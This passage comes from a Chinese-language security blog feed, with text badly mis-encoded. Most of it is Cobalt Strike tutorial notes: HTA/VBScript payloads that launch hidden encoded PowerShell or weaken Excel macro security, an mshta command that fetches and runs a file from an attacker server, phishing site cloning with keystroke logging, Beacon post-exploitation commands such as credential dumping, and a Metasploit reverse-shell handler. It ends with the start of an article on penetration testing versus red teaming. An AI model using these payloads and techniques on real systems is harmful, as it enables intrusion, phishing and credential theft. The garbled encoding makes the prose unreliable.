var_obj.DeleteFolder(var_basedir)</span><br><span class="line">    End Function</span><br><span class="line"></span><br><span class="line">    var_func</span><br><span class="line">    self.close</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>PowerShell ä¹Ÿæ˜¯ VBScript è„šæœ¬ä¸è¿‡ Wscript.Shell è¿è¡Œçš„æ˜¯ PowerShell ç¨‹åºï¼Œå…¶æ‰§è¡Œçš„å†…å®¹ç»è¿‡ Base64 ç¼–ç ã€‚</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">&quot;VBScript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="title class_">Function</span> <span class="title function_">var_func</span>()</span></span><br><span class="line"><span class="language-javascript">        <span class="title class_">Dim</span> var_shell</span></span><br><span class="line"><span class="language-javascript">        <span class="title class_">Set</span> var_shell = <span class="title class_">CreateObject</span>(<span class="string">&quot;Wscript.Shell&quot;</span>)</span></span><br><span class="line"><span class="language-javascript">        var_shell.<span class="property">run</span> <span class="string">&quot;powershell -nop -w hidden -encodedcommand JABzAD0ATgBlAHcALQBPAGIAagBlAG......MAdAAgAEkAoACkAOwA=&quot;</span>, <span class="number">0</span>, <span class="literal">true</span></span></span><br><span class="line"><span class="language-javascript">    <span class="title class_">End</span> <span class="title class_">Function</span></span></span><br><span class="line"><span class="language-javascript">    var_func</span></span><br><span class="line"><span class="language-javascript">    self.<span class="property">close</span></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>VBS å°†æ‰§è¡Œ Excel å®ä¸Šçº¿ã€‚è¿‡ç¨‹æ˜¯ä¿®æ”¹æ³¨å†Œè¡¨ä¿¡ä»» Excel å®ï¼Œå¹¶æ‰§è¡Œå®ï¼Œæœ€åæ¢å¤æ³¨å†Œè¡¨ã€‚</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span><span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">&quot;vbscript&quot;</span>&gt;</span></span><br><span class="line">Dim objExcel, WshShell, RegPath, action, objWorkbook, xlmodule</span><br><span class="line"></span><br><span class="line">Set objExcel = CreateObject(&quot;Excel.Application&quot;)</span><br><span class="line">objExcel.Visible = False</span><br><span class="line"></span><br><span class="line">Set WshShell = CreateObject(&quot;Wscript.Shell&quot;)</span><br><span class="line"></span><br><span class="line">function RegExists(regKey)</span><br><span class="line">    on error resume next</span><br><span class="line">    WshShell.RegRead regKey</span><br><span class="line">    RegExists = (Err.number = 0)</span><br><span class="line">end function</span><br><span class="line"></span><br><span class="line">&#x27; Get the old AccessVBOM value</span><br><span class="line">RegPath = &quot;HKEY_CURRENT_USER\Software\Microsoft\Office\&quot; &amp; objExcel.Version &amp; &quot;\Excel\Security\AccessVBOM&quot;</span><br><span class="line"></span><br><span class="line">if RegExists(RegPath) then</span><br><span class="line">    action = WshShell.RegRead(RegPath)</span><br><span class="line">else</span><br><span class="line">    action = &quot;&quot;</span><br><span class="line">end if</span><br><span class="line"></span><br><span class="line">&#x27; Weaken the target</span><br><span class="line">WshShell.RegWrite RegPath, 1, &quot;REG_DWORD&quot;</span><br><span class="line"></span><br><span class="line">&#x27; Run the macro</span><br><span class="line">Set objWorkbook = objExcel.Workbooks.Add()</span><br><span class="line">Set xlmodule = objWorkbook.VBProject.VBComponents.Add(1)</span><br><span class="line">xlmodule.CodeModule.AddFromString &quot;Private &quot;......&quot;</span><br><span class="line">objExcel.DisplayAlerts = False</span><br><span class="line">on error resume next</span><br><span class="line">objExcel.Run &quot;Auto_Open&quot;</span><br><span class="line">objWorkbook.Close False</span><br><span class="line">objExcel.Quit</span><br><span class="line"></span><br><span class="line">&#x27; Restore the registry to its old state</span><br><span class="line">if action = &quot;&quot; then</span><br><span class="line">    WshShell.RegDelete RegPath</span><br><span class="line">else</span><br><span class="line">    WshShell.RegWrite RegPath, action, &quot;REG_DWORD&quot;</span><br><span class="line">end if</span><br><span class="line">self.close</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>æ‰§è¡Œä¸Šçº¿å¾ˆç®€å•ï¼Œä½¿ç”¨ mshta æ‰§è¡Œ .hta æ–‡ä»¶å³å¯ã€‚</p><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">mshta http://<span class="number">192</span>.<span class="number">168</span>.<span class="number">0</span>.<span class="number">102</span>:<span class="number">80</span>/download/file.ext</span><br></pre></td></tr></table></figure><h3 id="MS-Office-Macroâ€“å¾…å­¦ä¹ "><a href="#MS-Office-Macroâ€“å¾…å­¦ä¹ " class="headerlink" title="MS Office Macroâ€“å¾…å­¦ä¹ "></a>MS Office Macroâ€“å¾…å­¦ä¹ </h3><p>å¾®è½¯ Office Wordï¼ŒExcelï¼ŒPowerPoint å¸¸è¯´å®éƒ½æ˜¯ç”¨ VBAï¼ˆVisual Basic for Applicationï¼‰ç¼–å†™çš„ï¼Œè¿™ä¸ªå®çš„ä½œç”¨æ˜¯å¯ä»¥è®¿é—®éƒ¨åˆ† Windows API æ¨¡æ‹Ÿé”®ç›˜ã€é¼ æ ‡ç­‰æ“ä½œã€‚</p><h3 id="Payload-Gennerator"><a href="#Payload-Gennerator" class="headerlink" title="Payload Gennerator"></a>Payload Gennerator</h3><p>ç”ŸæˆåŸå§‹ Payloadç”¨æ¥å½“ä½œå…æ€çš„åŸææ–™ã€‚</p><h3 id="Windows-Executable-x2F-Executable-S"><a href="#Windows-Executable-x2F-Executable-S" class="headerlink" title="Windows Executable&#x2F;Executable (S)"></a>Windows Executable&#x2F;Executable (S)</h3><h2 id="Web-Drive-byï¼ˆé’“é±¼æ”»å‡»ï¼‰"><a href="#Web-Drive-byï¼ˆé’“é±¼æ”»å‡»ï¼‰" class="headerlink" title="Web Drive-byï¼ˆé’“é±¼æ”»å‡»ï¼‰"></a>Web Drive-byï¼ˆé’“é±¼æ”»å‡»ï¼‰</h2><h3 id="System-Profier"><a href="#System-Profier" class="headerlink" title="System Profier"></a>System Profier</h3><p>ç³»ç»Ÿä¾¦å¯Ÿ<code>System Profiler</code>æ˜¯ä¸€ä¸ªæ–¹ä¾¿å®¢æˆ·ç«¯æ”»å‡»çš„ä¾¦å¯Ÿå·¥å…·ï¼Œè¿™ä¸ªå·¥å…·å°†ä¼šåœ¨CSæœåŠ¡ç«¯ä¸Šå¯åŠ¨ä¸€ä¸ªWebæœåŠ¡ï¼Œè¿™æ ·å½“ç›®æ ‡è®¿é—®è¿™ä¸ªWebæœåŠ¡çš„æ—¶å€™ï¼Œæˆ‘ä»¬å°±èƒ½å¤Ÿçœ‹åˆ°ç›®æ ‡ä½¿ç”¨çš„æµè§ˆå™¨ã€æ“ä½œç³»ç»Ÿç­‰ç­‰æŒ‡çº¹ä¿¡æ¯ã€‚</p><p><img src="/../images/image-20231011233039941.png" alt="image-20231011233039941"></p><p>è®¿é—®serverçš„<code>/baidu</code>ä¼šé‡å®šå‘åˆ°ç™¾åº¦ï¼Œè·å¾—åˆ°çš„æŒ‡çº¹å¯ä»¥åœ¨ä»¥ä¸‹æŸ¥çœ‹</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1ã€View --&gt; Applications</span><br><span class="line">2ã€View --&gt; Web Log</span><br><span class="line">3ã€Cobalt Strike --&gt; Visualization --&gt; Target Table</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20231011233209117.png" alt="image-20231011233209117"></p><p>å€¼å¾—æ³¨æ„çš„ä¸€ç‚¹æ˜¯å¦‚æœ Cobalt Strike çš„ web æœåŠ¡å™¨æ”¶åˆ°äº†lynxã€wget æˆ– curl çš„è¯·æ±‚ï¼ŒCSä¼šè‡ªåŠ¨è¿”å›ä¸€ä¸ª 404 é¡µé¢ï¼Œè¿™æ ·åšæ˜¯ä¸ºäº†é˜²å¾¡è“é˜Ÿçš„çª¥æ¢ã€‚</p><h3 id="Clone-siteï¼ˆå…‹éš†ç½‘ç«™ï¼‰"><a href="#Clone-siteï¼ˆå…‹éš†ç½‘ç«™ï¼‰" class="headerlink" title="Clone siteï¼ˆå…‹éš†ç½‘ç«™ï¼‰"></a>Clone siteï¼ˆå…‹éš†ç½‘ç«™ï¼‰</h3><p><img src="/../images/image-20231011234547914.png" alt="image-20231011234547914"></p><ul><li>Log keystrokes on cloned siteï¼šè·å–ç›®æ ‡çš„é”®ç›˜è®°å½•ï¼Œåœ¨WebLogä¸­å¯ä»¥æŸ¥çœ‹</li></ul><p><img src="/../images/image-20231011234520222.png" alt="image-20231011234520222"></p><p>å…‹éš†æ•ˆæœ</p><p><img src="/../images/image-20231011234648231.png" alt="image-20231011234648231"></p><h3 id="HostFile"><a href="#HostFile" class="headerlink" title="HostFile"></a>HostFile</h3><p>ä½œç”¨ç›¸å½“äºç”¨http.serverèµ·äº†ä¸€ä¸ªwebæœåŠ¡ï¼Œå°†æ–‡ä»¶ä¸Šä¼ åˆ°CSæœåŠ¡ç«¯ä¸Šæä¾›è¿œç¨‹æ–‡ä»¶ä¸‹è½½</p><p><img src="/../images/image-20231011234004732.png" alt="image-20231011234004732"></p><h3 id="Manager"><a href="#Manager" class="headerlink" title="Manager"></a>Manager</h3><p>ç”¨æ¥ç®¡ç†ä¸Šè¿°åŠŸèƒ½ä½¿ç”¨æ—¶åˆ›å»ºçš„Web ç«™ç‚¹</p><p><img src="/../images/image-20231011234837927.png" alt="image-20231011234837927"></p><h3 id="é‚®ä»¶é’“é±¼"><a href="#é‚®ä»¶é’“é±¼" class="headerlink" title="é‚®ä»¶é’“é±¼"></a>é‚®ä»¶é’“é±¼</h3><h1 id="åæ¸—é€"><a href="#åæ¸—é€" class="headerlink" title="åæ¸—é€"></a>åæ¸—é€</h1><h2 id="Beacon-ç®¡ç†"><a href="#Beacon-ç®¡ç†" class="headerlink" title="Beacon ç®¡ç†"></a>Beacon ç®¡ç†</h2><p>åœ¨ Beacon ä¼šè¯ä¸Šå³å‡» <code>interact</code>ï¼ˆäº¤äº’ï¼‰å³å¯æ‰“å¼€ Beacon æ§åˆ¶å°</p><p><strong>Beacon èœå•</strong></p><p>Accessï¼šåŒ…å«äº†ä¸€äº›å¯¹å‡­æ®çš„æ“ä½œåŠææƒçš„é€‰é¡¹</p><p>Exploreï¼šåŒ…å«äº†ä¿¡æ¯æ¢æµ‹ä¸ç›®æ ‡äº¤äº’çš„é€‰é¡¹</p><p>Pivotingï¼šåŒ…å«äº†ä¸€äº›è®¾ç½®ä»£ç†éš§é“çš„é€‰é¡¹</p><p>Sessionï¼šåŒ…å«äº†å¯¹å½“å‰ Beacon ä¼šè¯ç®¡ç†çš„é€‰é¡¹</p><p><strong>Beacon å‘½ä»¤</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">beacon&gt; <span class="built_in">help</span></span><br><span class="line"></span><br><span class="line">Beacon Commands</span><br><span class="line">===============</span><br><span class="line"></span><br><span class="line"> Command                   Description</span><br><span class="line">    -------                   -----------</span><br><span class="line">    argue                     è¿›ç¨‹å‚æ•°æ¬ºéª—</span><br><span class="line">    blockdlls                 é˜»æ­¢å­è¿›ç¨‹åŠ è½½éMicrosoft DLL</span><br><span class="line">    browserpivot              æ³¨å…¥å—å®³è€…æµè§ˆå™¨è¿›ç¨‹</span><br><span class="line">    bypassuac                 ç»•è¿‡UACæå‡æƒé™</span><br><span class="line">    cancel                    å–æ¶ˆæ­£åœ¨è¿›è¡Œçš„ä¸‹è½½</span><br><span class="line">    <span class="built_in">cd</span>                        åˆ‡æ¢ç›®å½•</span><br><span class="line">    checkin                   å¼ºåˆ¶è®©è¢«æ§ç«¯å›è¿ä¸€æ¬¡</span><br><span class="line">    clear                     æ¸…é™¤beaconå†…éƒ¨çš„ä»»åŠ¡é˜Ÿåˆ—</span><br><span class="line">    connect                   Connect to a Beacon peer over TCP</span><br><span class="line">    covertvpn                 éƒ¨ç½²Covert VPNå®¢æˆ·ç«¯</span><br><span class="line">    <span class="built_in">cp</span>                        å¤åˆ¶æ–‡ä»¶</span><br><span class="line">    dcsync                    ä»DCä¸­æå–å¯†ç å“ˆå¸Œ</span><br><span class="line">    desktop                   è¿œç¨‹æ¡Œé¢(VNC)</span><br><span class="line">    dllinject                 åå°„DLLæ³¨å…¥è¿›ç¨‹</span><br><span class="line">    dllload                   ä½¿ç”¨LoadLibraryå°†DLLåŠ è½½åˆ°è¿›ç¨‹ä¸­</span><br><span class="line">    download                  ä¸‹è½½æ–‡ä»¶</span><br><span class="line">    downloads                 åˆ—å‡ºæ­£åœ¨è¿›è¡Œçš„æ–‡ä»¶ä¸‹è½½</span><br><span class="line">    drives                    åˆ—å‡ºç›®æ ‡ç›˜ç¬¦</span><br><span class="line">    elevate                   ä½¿ç”¨exp</span><br><span class="line">    execute                   åœ¨ç›®æ ‡ä¸Šæ‰§è¡Œç¨‹åº(æ— è¾“å‡º)</span><br><span class="line">    execute-assembly          åœ¨ç›®æ ‡ä¸Šå†…å­˜ä¸­æ‰§è¡Œæœ¬åœ°.NETç¨‹åº</span><br><span class="line">    <span class="built_in">exit</span>                      ç»ˆæ­¢beaconä¼šè¯</span><br><span class="line">    getprivs                  Enable system privileges on current token</span><br><span class="line">    getsystem                 å°è¯•è·å–SYSTEMæƒé™</span><br><span class="line">    getuid                    è·å–ç”¨æˆ·ID</span><br><span class="line">    hashdump                  è½¬å‚¨å¯†ç å“ˆå¸Œå€¼</span><br><span class="line">    <span class="built_in">help</span>                      å¸®åŠ©</span><br><span class="line">    inject                    åœ¨æ³¨å…¥è¿›ç¨‹ç”Ÿæˆä¼šè¯</span><br><span class="line">    jobkill                   ç»“æŸä¸€ä¸ªåå°ä»»åŠ¡</span><br><span class="line">    <span class="built_in">jobs</span>                      åˆ—å‡ºåå°ä»»åŠ¡</span><br><span class="line">    kerberos_ccache_use       ä»ccacheæ–‡ä»¶ä¸­å¯¼å…¥ç¥¨æ®åº”ç”¨äºæ­¤ä¼šè¯</span><br><span class="line">    kerberos_ticket_purge     æ¸…é™¤å½“å‰ä¼šè¯çš„ç¥¨æ®</span><br><span class="line">    kerberos_ticket_use       Apply ä»ticketæ–‡ä»¶ä¸­å¯¼å…¥ç¥¨æ®åº”ç”¨äºæ­¤ä¼šè¯</span><br><span class="line">    keylogger                 é”®ç›˜è®°å½•</span><br><span class="line">    <span class="built_in">kill</span>                      ç»“æŸè¿›ç¨‹</span><br><span class="line">    <span class="built_in">link</span>                      Connect to a Beacon peer over a named pipe</span><br><span class="line">    logonpasswords            ä½¿ç”¨mimikatzè½¬å‚¨å‡­æ®å’Œå“ˆå¸Œå€¼</span><br><span class="line">    <span class="built_in">ls</span>                        åˆ—å‡ºæ–‡ä»¶</span><br><span class="line">    make_token                åˆ›å»ºä»¤ç‰Œä»¥ä¼ é€’å‡­æ®</span><br><span class="line">    mimikatz                  è¿è¡Œmimikatz</span><br><span class="line">    <span class="built_in">mkdir</span>                     åˆ›å»ºä¸€ä¸ªç›®å½•</span><br><span class="line">    mode dns                  ä½¿ç”¨DNS Aä½œä¸ºé€šä¿¡é€šé“(ä»…é™DNS beacon)</span><br><span class="line">    mode dns-txt              ä½¿ç”¨DNS TXTä½œä¸ºé€šä¿¡é€šé“(ä»…é™D beacon)</span><br><span class="line">    mode dns6                 ä½¿ç”¨DNS AAAAä½œä¸ºé€šä¿¡é€šé“(ä»…é™DNS beacon)</span><br><span class="line">    mode http                 ä½¿ç”¨HTTPä½œä¸ºé€šä¿¡é€šé“</span><br><span class="line">    <span class="built_in">mv</span>                        ç§»åŠ¨æ–‡ä»¶</span><br><span class="line">    net                       netå‘½ä»¤</span><br><span class="line">    note                      å¤‡æ³¨       </span><br><span class="line">    portscan                  è¿›è¡Œç«¯å£æ‰«æ</span><br><span class="line">    powerpick                 é€šè¿‡Unmanaged PowerShellæ‰§è¡Œå‘½ä»¤</span><br><span class="line">    powershell                é€šè¿‡powershell.exeæ‰§è¡Œå‘½ä»¤</span><br><span class="line">    powershell-import         å¯¼å…¥powershellè„šæœ¬</span><br><span class="line">    ppid                      Set parent PID <span class="keyword">for</span> spawned post-ex <span class="built_in">jobs</span></span><br><span class="line">    ps                        æ˜¾ç¤ºè¿›ç¨‹åˆ—è¡¨</span><br><span class="line">    psexec                    Use a service to spawn a session on a host</span><br><span class="line">    psexec_psh                Use PowerShell to spawn a session on a host</span><br><span class="line">    psinject                  åœ¨ç‰¹å®šè¿›ç¨‹ä¸­æ‰§è¡ŒPowerShellå‘½ä»¤</span><br><span class="line">    pth                       ä½¿ç”¨Mimikatzè¿›è¡Œä¼ é€’å“ˆå¸Œ</span><br><span class="line">    <span class="built_in">pwd</span>                       å½“å‰ç›®å½•ä½ç½®</span><br><span class="line">    reg                       Query the registry</span><br><span class="line">    rev2self                  æ¢å¤åŸå§‹ä»¤ç‰Œ</span><br><span class="line">    <span class="built_in">rm</span>                        åˆ é™¤æ–‡ä»¶æˆ–æ–‡ä»¶å¤¹</span><br><span class="line">    rportfwd                  ç«¯å£è½¬å‘</span><br><span class="line">    run                       åœ¨ç›®æ ‡ä¸Šæ‰§è¡Œç¨‹åº(è¿”å›è¾“å‡º)</span><br><span class="line">    runas                     ä»¥å…¶ä»–ç”¨æˆ·æƒé™æ‰§è¡Œç¨‹åº</span><br><span class="line">    runasadmin                åœ¨é«˜æƒé™ä¸‹æ‰§è¡Œç¨‹åº</span><br><span class="line">    runu                      Execute a program under another PID</span><br><span class="line">    screenshot                å±å¹•æˆªå›¾</span><br><span class="line">    setenv                    è®¾ç½®ç¯å¢ƒå˜é‡</span><br><span class="line">    shell                     æ‰§è¡Œcmdå‘½ä»¤</span><br><span class="line">    shinject                  å°†shellcodeæ³¨å…¥è¿›ç¨‹</span><br><span class="line">    shspawn                   å¯åŠ¨ä¸€ä¸ªè¿›ç¨‹å¹¶å°†shellcodeæ³¨å…¥å…¶ä¸­</span><br><span class="line">    <span class="built_in">sleep</span>                     è®¾ç½®ç¡çœ å»¶è¿Ÿæ—¶é—´</span><br><span class="line">    socks                     å¯åŠ¨SOCKS4ä»£ç†</span><br><span class="line">    socks stop                åœæ­¢SOCKS4</span><br><span class="line">    spawn                     Spawn a session </span><br><span class="line">    spawnas                   Spawn a session as another user</span><br><span class="line">    spawnto                   Set executable to spawn processes into</span><br><span class="line">    spawnu                    Spawn a session under another PID</span><br><span class="line">    ssh                       ä½¿ç”¨sshè¿æ¥è¿œç¨‹ä¸»æœº</span><br><span class="line">    ssh-key                   ä½¿ç”¨å¯†é’¥è¿æ¥è¿œç¨‹ä¸»æœº</span><br><span class="line">    steal_token               ä»è¿›ç¨‹ä¸­çªƒå–ä»¤ç‰Œ</span><br><span class="line">    timestomp                 å°†ä¸€ä¸ªæ–‡ä»¶çš„æ—¶é—´æˆ³åº”ç”¨åˆ°å¦ä¸€ä¸ªæ–‡ä»¶</span><br><span class="line">    <span class="built_in">unlink</span>                    Disconnect from parent Beacon</span><br><span class="line">    upload                    ä¸Šä¼ æ–‡ä»¶</span><br><span class="line">    wdigest                   ä½¿ç”¨mimikatzè½¬å‚¨æ˜æ–‡å‡­æ®</span><br><span class="line">    winrm                     ä½¿ç”¨WinRMæ¨ªå‘æ¸—é€</span><br><span class="line">    wmi                       ä½¿ç”¨WMIæ¨ªå‘æ¸—</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å¦‚æœä¸çŸ¥é“æ€ä¹ˆä½¿ç”¨è¿™äº›å‘½ä»¤ï¼Œé€šè¿‡ help è·Ÿä¸Šå…·ä½“å‘½ä»¤ <code>help &lt;command&gt;</code>ï¼Œä¼šè¾“å‡ºå…·ä½“ä½¿ç”¨è¯´æ˜ã€‚</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">beacon&gt; <span class="built_in">help</span> <span class="built_in">ls</span></span><br><span class="line">Use: <span class="built_in">ls</span> [folder]</span><br><span class="line"></span><br><span class="line">Lists files <span class="keyword">in</span> a folder</span><br></pre></td></tr></table></figure><p><code>[folder]</code> æ˜¯å¿…é€‰çš„å‚æ•° å¦‚æœé‡åˆ°å°–æ‹¬å·å¦‚ <code>&lt;argrument name&gt;</code> å°±æ˜¯å¯é€‰å‚æ•°ã€‚</p><h2 id="Beaconæ´¾ç”Ÿï¼ˆä¼šè¯ä¼ é€’ï¼‰"><a href="#Beaconæ´¾ç”Ÿï¼ˆä¼šè¯ä¼ é€’ï¼‰" class="headerlink" title="Beaconæ´¾ç”Ÿï¼ˆä¼šè¯ä¼ é€’ï¼‰"></a>Beaconæ´¾ç”Ÿï¼ˆä¼šè¯ä¼ é€’ï¼‰</h2><ul><li><p>å°†å½“å‰ä¼šè¯ä¼ é€’è‡³å…¶ä»–CSå›¢é˜ŸæœåŠ¡å™¨ä¸­ï¼Œç›´æ¥å³å‡»<code>spawn</code>é€‰æ‹©è¦ä¼ é€’çš„ç›‘å¬å™¨å³å¯ã€‚</p></li><li><p>å°†å½“å‰ä¼šè¯ä¼ é€’è‡³MSFä¸­</p><p>CSåˆ›å»ºForeignç›‘å¬å™¨</p><p><img src="/../images/image-20231014201928307.png" alt="image-20231014201928307"></p><p>MSF</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> payload windows/meterpreter/reverse_http</span><br><span class="line"><span class="built_in">set</span> LHOST 192.168.111.128</span><br><span class="line"><span class="built_in">set</span> lport 9999</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>CSå³é”®ä¼šè¯æ´¾ç”Ÿï¼ˆspawnï¼‰é€‰æ‹©åˆšåˆšåˆ›å»ºå¥½çš„Foreignç›‘å¬å™¨</p><p><img src="/../images/image-20231014202406347.png" alt="image-20231014202406347"></p><p>å¦‚ä¸‹æˆåŠŸæ´¾ç”Ÿ</p><p><img src="/../images/image-20231014202434316.png" alt="image-20231014202434316"></p></li></ul><h1 id="æ’ä»¶å¢å¼º"><a href="#æ’ä»¶å¢å¼º" class="headerlink" title="æ’ä»¶å¢å¼º"></a>æ’ä»¶å¢å¼º</h1><p><a href="https://github.com/lintstar/LSTAR">GitHub - lintstar&#x2F;LSTAR: LSTAR - CobaltStrike ç»¼åˆåæ¸—é€æ’ä»¶</a> <a href="https://github.com/pandasec888/taowu-cobalt-strike">GitHub - pandasec888&#x2F;taowu-cobalt-strike</a></p><p><a href="https://github.com/pandasec888/taowu-cobalt_strike">pandasec888&#x2F;taowu-cobalt_strike (github.com)</a></p><h1 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h1><p>ä½œè€…è€ç‰ˆæœ¬å®˜æ–¹æ•™ç¨‹ä¸­æ–‡ç¿»è¯‘<a href="https://www.bilibili.com/video/BV16b411i7n5/">https://www.bilibili.com/video/BV16b411i7n5/</a></p><p><a href="https://teamssix.com/201023-192553.html#toc-heading-20">ã€å»ºè®®æ”¶è—ã€‘CSå­¦ä¹ ç¬”è®°åˆé›† | TeamsSix</a></p><p><a href="https://blog.ateam.qianxin.com/post/cobalt-strike-40-shou-ce-fan-yi-2019-nian-12-yue-2-ri-geng-xin-ban-ben/">Cobalt Strike 4.0 æ‰‹å†Œç¿»è¯‘ (2019å¹´12æœˆ2æ—¥æ›´æ–°ç‰ˆæœ¬) - å¥‡å®‰ä¿¡A-TEAMæŠ€æœ¯åšå®¢ (qianxin.com)</a></p><p><a href="https://www.raingray.com/archives/4385.html#C2+%E4%BD%BF%E7%94%A8">Red Team: Infrastructure - raingray Blog</a></p>]]></content>
      
      
      <categories>
          
          <category> å·¥å…·ä½¿ç”¨ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>è½¬è½½--æ¸—é€æµ‹è¯•å’Œçº¢é˜Ÿçš„åŒºåˆ«</title>
      <link href="/2023/07/11/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%92%8C%E7%BA%A2%E9%98%9F%E7%9A%84%E5%8C%BA%E5%88%AB/"/>
      <url>/2023/07/11/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%92%8C%E7%BA%A2%E9%98%9F%E7%9A%84%E5%8C%BA%E5%88%AB/</url>
      
        <content type="html"><![CDATA[<blockquote><p>æœ¬æ–‡æ¥è‡ªå­Ÿæå®éªŒå®¤ï¼Œç‰ˆæƒå½’ä½œè€…æ‰€æœ‰</p></blockquote><h1 id="è°ˆè°ˆæ¸—é€æµ‹è¯•å’Œçº¢é˜Ÿçš„åŒºåˆ«"><a href="#è°ˆè°ˆæ¸—é€æµ‹è¯•å’Œçº¢é˜Ÿçš„åŒºåˆ«" class="headerlink" title="è°ˆè°ˆæ¸—é€æµ‹è¯•å’Œçº¢é˜Ÿçš„åŒºåˆ«"></a>è°ˆè°ˆæ¸—é€æµ‹è¯•å’Œçº¢é˜Ÿçš„åŒºåˆ«</h1><p>æœ€è¿‘åœ¨å„ç§å®‰å…¨ç›¸å…³çš„èµ„è®¯æˆ–è€…æŠ€æœ¯æ–‡ç« ä¸­ï¼Œè¶Šæ¥è¶Šå¤šçš„æåˆ°æ¸—é€æµ‹è¯•ï¼ˆæ¸—é€ Testingï¼‰å’Œçº¢é˜Ÿï¼ˆRed Teamï¼‰è¿™ä¸ªä¸¤ä¸ªè¯ï¼Œè€Œä¸”å¾ˆå¤šåœ°æ–¹æ˜¯æŠŠè¿™ä¸¤ä¸ªè¯çš„æ„æ€æ··ä¸ºä¸€ä½“ï¼Œè®¤ä¸ºæ˜¯ç›¸åŒçš„ä¸œè¥¿ã€‚è™½ç„¶è¿™ä¸¤è€…åœ¨æ–¹æ³•å’Œå®æ–½è¿‡ç¨‹ä¸­å­˜åœ¨ä¸€å®šç›¸ä¼¼ç”šè‡³é‡åˆçš„éƒ¨åˆ†ï¼Œä½†æ˜¯æ¸—é€æµ‹è¯•å’Œçº¢é˜Ÿè¿˜æ˜¯å­˜åœ¨ä¸€äº›æœ¬è´¨çš„å·®å¼‚ã€‚æœ¬æ–‡å°†åˆ†åˆ«å¯¹ä¸¤è€…è¿›è¡Œå®šä¹‰å’Œæè¿°ï¼Œæ–¹ä¾¿ä¼ä¸šæ ¹æ®è‡ªèº«å®‰å…¨éœ€æ±‚é€‰æ‹©åˆé€‚çš„å®‰å…¨æœåŠ¡ï¼Œä¹Ÿèƒ½ä»¥æ­¤è¯†åˆ«é‚£äº›æ‰“ç€çº¢é˜Ÿå¹Œå­å®é™…å¹²ç€æ¸—é€æµ‹è¯•æ´»çš„å®‰å…¨å…¬å¸ã€‚</p><h2 id="æ¸—é€æµ‹è¯•"><a href="#æ¸—é€æµ‹è¯•" class="headerlink" title="æ¸—é€æµ‹è¯•"></a>æ¸—é€æµ‹è¯•</h2><p>æ¸—é€æµ‹è¯•æ˜¯å¯¹ç»™å®šçš„ç›®æ ‡ç³»ç»Ÿè¿›è¡Œå®‰å…¨æµ‹è¯•ï¼Œæ‰¾å‡ºæ¼æ´æˆ–é£é™©çš„è¿‡ç¨‹ã€‚æ¸—é€æµ‹è¯•å·¥ç¨‹å¸ˆä¼šä»ä¸åŒçš„å±‚é¢ï¼ˆåŒ…æ‹¬åº”ç”¨å±‚ã€ç½‘ç»œå±‚ã€ç³»ç»Ÿå±‚ç”šè‡³ç‰©ç†å±‚ï¼‰å¯¹ç›®æ ‡ç³»ç»Ÿè¿›è¡Œè„†å¼±æ€§åˆ†æï¼Œå°è¯•æ‰¾å‡ºå°½å¯èƒ½å¤šçš„æ¼æ´ã€é…ç½®é”™è¯¯æˆ–å…¶ä»–å®‰å…¨é£é™©ï¼Œå¹¶å°è¯•å¯¹è¿™äº›æ‰¾åˆ°çš„æ¼æ´è¿›è¡Œç»„åˆåˆ©ç”¨ï¼Œæœ€ç»ˆè·å–åˆ°è®¿é—®å…³é”®éšç§æ•°æ®çš„æƒé™ï¼ˆéšç§æ•°æ®åŒ…æ‹¬ç”¨æˆ·ä¿¡æ¯æˆ–è€…å•†ä¸šç§˜å¯†ç­‰ï¼‰ã€‚æ¸—é€æµ‹è¯•è¿‡ç¨‹ä¸­å¯¹æ¼æ´çš„åˆ©ç”¨ä¸€æ–¹é¢èƒ½è¯æ˜æ¼æ´çœŸå®å­˜åœ¨ï¼Œå¦ä¸€æ–¹é¢è¿™äº›æ¼æ´çš„åˆ©ç”¨ç»“æœä¹Ÿèƒ½æ­ç¤ºå‡ºç›®æ ‡ç³»ç»Ÿæ‰€é¢ä¸´çš„é£é™©ç­‰çº§ã€‚</p><p>æ¸—é€æµ‹è¯•ä¸“æ³¨äºå¯¹ç»™å®šçš„ç³»ç»Ÿè¿›è¡Œæµ‹è¯•ï¼Œå­˜åœ¨æ˜ç¡®çš„æµ‹è¯•ç›®æ ‡å’Œæµ‹è¯•è¾¹ç•Œã€‚ä¼ä¸šä¼šæŒ‡å®šæµ‹è¯•èµ·å§‹æ—¶é—´å’Œç»“æŸæ—¶é—´ï¼Œæµ‹è¯•æ—¶é•¿ä¸€èˆ¬ä¸º1åˆ°2å‘¨ã€‚æµ‹è¯•ç›®æ 